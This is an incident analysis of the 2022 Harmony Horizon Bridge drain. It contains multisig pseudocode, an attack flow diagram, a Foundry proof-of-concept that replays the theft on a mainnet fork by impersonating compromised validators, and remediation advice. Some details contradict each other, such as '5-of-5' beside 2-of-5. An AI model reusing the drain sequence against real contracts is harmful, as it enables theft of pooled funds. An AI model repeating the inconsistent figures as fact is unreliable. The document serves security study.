# Harmony Bridge — Multisig Key Compromise Analysis

| Item | Details |
|------|------|
| **Date** | 2022-06-24 |
| **Protocol** | Harmony Horizon Bridge |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$100,000,000 (USDT, ETH, WBTC, and multiple other assets) |
| **Attacker** | [0xf845A7ee8477AD1FB4446651E548901a2635A915](https://etherscan.io/address/0xf845A7ee8477AD1FB4446651E548901a2635A915) |
| **Vulnerable Contract** | Harmony MultiSig [0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6](https://etherscan.io/address/0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6) |
| **Root Cause** | In a 5-of-5 signing structure, 2 validator private keys were compromised, allowing malicious transactions that satisfied the 2-of-5 quorum requirement to drain the entire bridge fund |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Harmony_multisig_exp.sol) |

---
## 1. Vulnerability Overview

Harmony's Horizon Bridge managed asset transfers from Ethereum to Harmony through a contract protected by a `MultiSigWallet`. The bridge operated on a 2-of-5 structure where only 2 signatures out of 5 validator keys were required to execute a transaction.

The attacker compromised 2 of the 5 validator private keys (presumably through social engineering, infrastructure breach, or similar means). Using the compromised keys, they sequentially called `submitTransaction()` and `confirmTransaction()` to drain approximately $100 million worth of assets — including USDT, ETH, and WBTC — held by the bridge to the attacker's address.

---
## 2. Vulnerable Code Analysis

```solidity
// Harmony MultiSigWallet (Gnosis Safe-like structure — pseudocode)
contract MultiSigWallet {
    address[] public owners;          // 5 validators
    uint256 public required = 2;      // ❌ 2-of-5: low quorum

    mapping(uint256 => Transaction) public transactions;
    mapping(uint256 => mapping(address => bool)) public confirmations;

    struct Transaction {
        address destination;
        uint256 value;
        bytes data;
        bool executed;
    }

    // Signer #1: submit transaction + first confirmation
    function submitTransaction(
        address destination,
        uint256 value,
        bytes calldata data
    ) external onlyOwner returns (uint256 transactionId) {
        transactionId = addTransaction(destination, value, data);
        confirmTransaction(transactionId); // automatically adds first signature
    }

    // Signer #2: second confirmation → quorum met → auto-execute
    function confirmTransaction(uint256 transactionId) external onlyOwner {
        confirmations[transactionId][msg.sender] = true;
        // ❌ with required = 2, the second signature alone triggers immediate execution
        if (isConfirmed(transactionId)) {
            executeTransaction(transactionId);
        }
    }

    function executeTransaction(uint256 transactionId) internal {
        Transaction storage txn = transactions[transactionId];
        txn.executed = true;
        // Call target contract — unlockToken(), etc.
        (bool success,) = txn.destination.call{value: txn.value}(txn.data);
        require(success, "tx failed");
    }
}

// ✅ Correct pattern: higher quorum + Timelock
contract MultiSigWalletFixed {
    uint256 public required = 4; // ✅ 4-of-5 or higher

    // ✅ Timelock added for high-value transactions
    uint256 public constant TIMELOCK = 48 hours;
    mapping(uint256 => uint256) public submissionTime;

    function executeTransaction(uint256 transactionId) internal {
        require(
            block.timestamp >= submissionTime[transactionId] + TIMELOCK,
            "timelock not expired"
        );
        // execution logic...
    }
}
```

---
### On-chain Source Code

Source: Sourcify verified


**MultiSigWallet.sol** — entry point:
```solidity
// ❌ Root cause: 2 validator private keys were compromised from a 5-of-5 signing structure,
//    allowing malicious transactions that satisfied the 2-of-5 quorum to drain the entire bridge fund
    function addOwner(address owner)
        public
        onlyWallet
        ownerDoesNotExist(owner)
        notNull(owner)
        validRequirement(owners.length + 1, required)
    {
        isOwner[owner] = true;
        owners.push(owner);
        emit OwnerAddition(owner);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (holding 2 compromised validator keys)
    │
    ├─[Pre] Compromise private keys of 2 validators
    │         (suspected infrastructure breach / social engineering / hot wallet exposure)
    │
    ├─[1] Call MultiSig.submitTransaction() (validator key #1)
    │       destination = BridgeTarget(0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857)
    │       data = unlockToken(USDT, 9,981,000, attacker)
    │       → transactionId created + first signature automatically added
    │
    ├─[2] Call MultiSig.confirmTransaction(txId) (validator key #2)
    │       → second signature added
    │       → required(2) satisfied → executeTransaction() auto-triggered
    │
    ├─[3] Bridge contract: unlockToken() executed
    │       9,981,000 USDT → transferred to attacker address
    │
    ├─[4] Same pattern repeated for ETH, WBTC, BUSD, etc.
    │
    └─[5] Total loss: ~$100,000,000
              (including 9,981,000 USDT and multiple other assets)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IMultiSigWallet {
    // Submit transaction (includes first signature)
    function submitTransaction(
        address destination,
        uint256 value,
        bytes calldata data
    ) external returns (uint256 transactionId);

    // Additional signature confirmation → auto-execute when quorum is met
    function confirmTransaction(uint256 transactionId) external;

    // Query list of signers for a specific transaction
    function getConfirmations(uint256 transactionId)
        external view returns (address[] memory);
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    IMultiSigWallet multiSig =
        IMultiSigWallet(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6);

    address target   = 0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857; // bridge contract
    address attacker = 0xf845A7ee8477AD1FB4446651E548901a2635A915;

    // Compromised validator addresses (actual validators identified from public information)
    address validator1 = 0x...;  // first compromised validator key
    address validator2 = 0x...;  // second compromised validator key

    function setUp() public {
        vm.createSelectFork("mainnet", 15_012_645);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] USDT balance", USDT.balanceOf(attacker), 6);

        // PoC: submit transaction with compromised key #1
        bytes memory data = abi.encodeWithSignature(
            "unlockToken(address,uint256,address,bytes32)",
            address(USDT), 9_981_000 * 1e6, attacker, bytes32(0)
        );

        vm.prank(validator1);
        uint256 txId = multiSig.submitTransaction(target, 0, data);

        // confirm with compromised key #2 → required(2) satisfied → auto-execute
        vm.prank(validator2);
        multiSig.confirmTransaction(txId);

        emit log_named_decimal_uint("[After] USDT stolen", USDT.balanceOf(attacker), 6);
        // expected output: 9,981,000 USDT theft confirmed
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Multisig Private Key Compromise (Key Compromise) |
| **CWE** | CWE-287: Improper Authentication |
| **OWASP DeFi** | Low-quorum multisig + private key compromise |
| **Attack Vector** | Calling `submitTransaction()` + `confirmTransaction()` with 2 compromised keys |
| **Preconditions** | Private keys of 2 validators compromised, required = 2 |
| **Impact** | Entire bridge assets drained — ~$100M |

---
## 6. Remediation Recommendations

1. **Increase quorum threshold**: Use a quorum of 5-of-9 or 4-of-7 or higher. A 2-of-5 structure puts all funds at risk with the compromise of just 2 keys.
2. **Hardware Security Module (HSM)**: Store validator private keys in HSMs and prohibit the use of hot wallets.
3. **Mandatory Timelock**: Apply a minimum 48-hour timelock to high-value withdrawals to allow time to detect and block compromises.
4. **Anomalous Transaction Monitoring**: Build a real-time monitoring system for bridge withdrawal transactions to receive immediate alerts on abnormally large withdrawals.
5. **Distributed Key Management**: Geographically and organizationally distribute validator keys to prevent a single compromise event from exposing multiple keys simultaneously.

---
## 7. Lessons Learned

- **Same pattern as the Ronin Bridge**: This is the exact same mechanism as the Ronin Bridge attack in March 2022 (5/9 keys compromised, $620M lost). The identical incident repeated itself in just 3 months.
- **Multisig ≠ Decentralization**: The multisig structure itself is secure, but a low quorum combined with poor key management turns it into a single point of failure.
- **$100M loss**: One of the largest attacks in DeFi history. It reaffirmed the severity of bridge hacks.
- **North Korea's Lazarus Group suspected**: On-chain analysis identified the Lazarus Group as the likely perpetrator, exhibiting fund movement patterns similar to the Ronin attack.